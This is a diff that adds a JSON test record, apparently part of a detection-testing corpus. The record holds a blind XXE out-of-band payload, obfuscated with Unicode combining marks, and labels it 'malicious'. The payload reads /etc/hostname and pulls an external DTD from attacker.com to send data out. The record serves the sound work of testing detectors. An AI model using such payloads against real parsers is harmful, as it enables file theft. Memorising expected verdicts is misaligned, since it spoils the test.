@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "gt::output::out-xxe-blind-oob.txt::unicode-variations::4",
+  "base_sample_id": "gt::output::out-xxe-blind-oob.txt",
+  "generator_id": "unicode-variations",
+  "generator_version": "1.0.0",
+  "seed": -158686051,
+  "content": "# Marfą̀̀ak AI Secûrit̃y - XXE blin̂̈d OOB\n\n**WARNING: Thï̧̧s payload tests XXE blind ÒOB̃̂̃.**\n\n<?xml veŗ̨̊sion=\"1.0\" en̨coding=\"Ų̈́TF-8\"?>\n<!DOCTYPE foo [\n  <!EŅ̂̂T̂́ITY % file SYŞ̈TEM \"f̂́̂ile:///etc/host̀name\">\n  <!ENTITY % d̊̀td S̨̈̈YS̨̊̃T̀EM \"http̃̀̂s://attacker.com/xxè.d̈td\">\n  %d́̈td;\n]>\n<data>Bĺ̈̂ind XXE exfiltration v̂́̂ia OÓB̨́̊ channel</data>",
+  "content_hash": "ff7572088dd468c872e273d455546a6c9f4b586fa9eae63346b431ac90c4262a",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "unicode:combining-marks",
+  "difficulty": "advanced"
+}
